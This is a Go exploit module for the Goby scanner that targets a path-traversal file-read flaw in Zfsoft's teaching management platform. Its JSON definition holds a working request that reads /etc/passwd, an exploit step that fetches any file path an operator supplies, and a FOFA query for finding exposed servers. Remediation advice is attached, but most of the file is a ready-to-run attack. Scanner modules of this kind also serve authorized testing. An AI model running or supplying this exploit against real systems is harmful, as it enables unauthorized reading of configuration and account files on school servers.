package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Zfsoft Teaching GISP /WebReport/ReportServer File Read Vulnerability",
    "Description": "<p>With training, operation, guarantee and monitoring as the main line, the Zhengfang teaching management information service platform realizes the superposition of transactional management and strategic management of teaching affairs, and meets the strategic needs of school training process management, teaching quality inspection, teaching work evaluation, teaching performance evaluation, teaching reform and development, etc.</p><p>There is File Read Vulnerability in theZfsoft Teaching GISP ReportServer, the attacker can obtain the account information through the vulnerability.</p>",
    "Product": "Zfsoft-Teaching-GISP",
    "Homepage": "http://www.zfsoft.com/",
    "DisclosureDate": "2023-04-23",
    "PostTime": "2024-04-10",
    "Author": "mayuze@baimaohui.net",
    "FofaQuery": "body=\"正方软件股份有限公司\"&&title=\"教学管理信息服务平台\"",
    "GobyQuery": "body=\"正方软件股份有限公司\"&&title=\"教学管理信息服务平台\"",
    "Level": "2",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.zfsoft.com/\">http://www.zfsoft.com/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filepath",
            "type": "input",
            "value": "../../../../../../../../../../../../../../../../../../etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/WebReport/ReportServer?op=resource&resource=../../../../../../../../../../../../../../../../../../etc/passwd&i18n=true",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/WebReport/ReportServer?op=resource&resource=../../../../../../../../../../../../../../../../../../etc/passwd&i18n=true"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/WebReport/ReportServer?op=resource&resource={{{filepath}}}&i18n=true",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "File Read",
        "HW-2023"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.4",
    "Translation": {
        "CN": {
            "Name": "正方软件 教学综合信息服务平台 /WebReport/ReportServer 文件读取漏洞",
            "Product": "正方软件-教学综合信息服务平台",
            "Description": "<p>正方教学管理信息服务平台以培养、运行、保障、监控为主线，实现教务工作事务性管理和战略性管理的相互叠加，满足学校培养过程管理、教学质量检查、教学工作评价、教学业绩评价、教学改革发展等战略性需求。</p><p>正方软件教学综合信息服务平台ReportServer存在任意文件读取，攻击者可以通过漏洞获取账户信息</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.zfsoft.com/\">http://www.zfsoft.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "Zfsoft Teaching GISP /WebReport/ReportServer File Read Vulnerability",
            "Product": "Zfsoft-Teaching-GISP",
            "Description": "<p>With training, operation, guarantee and monitoring as the main line, the Zhengfang teaching management information service platform realizes the superposition of transactional management and strategic management of teaching affairs, and meets the strategic needs of school training process management, teaching quality inspection, teaching work evaluation, teaching performance evaluation, teaching reform and development, etc.<br></p><p>There is File Read Vulnerability in theZfsoft Teaching GISP ReportServer, the attacker can obtain the account information through the vulnerability.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.zfsoft.com/\">http://www.zfsoft.com/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "10967"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
